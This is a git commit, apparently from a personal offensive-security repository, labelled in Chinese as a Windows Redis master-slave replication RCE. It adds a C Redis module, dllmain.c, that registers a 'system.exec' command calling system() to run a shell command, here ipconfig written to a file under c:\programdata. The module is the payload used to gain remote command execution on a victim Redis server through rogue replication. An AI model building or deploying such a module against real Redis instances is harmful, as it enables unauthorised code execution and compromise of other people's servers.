a804c37261dde99856830a9379b4f14edc234ba5
learner-ing <58681115+learner-ing@users.noreply.github.com>
2021-10-30 21:41:30 +0800

    windows redis主从复制rce

---
+++ dllmain.c
@@ -0,0 +1,20 @@
+﻿#define _CRT_SECURE_NO_WARNINGS
+#include "pch.h"
+#include "redismodule.h"
+#include <stdio.h>
+__declspec(dllexport) int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc);
+
+int DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
+	system("ipconfig >c:\\programdata\\a.txt");
+	return REDISMODULE_OK;
+}
+
+int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
+	if (RedisModule_Init(ctx, "system", 1, REDISMODULE_APIVER_1)
+		== REDISMODULE_ERR) return REDISMODULE_ERR;
+
+	if (RedisModule_CreateCommand(ctx, "system.exec",
+		DoCommand, "readonly", 0, 0, 0) == REDISMODULE_ERR)
+		return REDISMODULE_ERR;
+	return REDISMODULE_OK;
+}
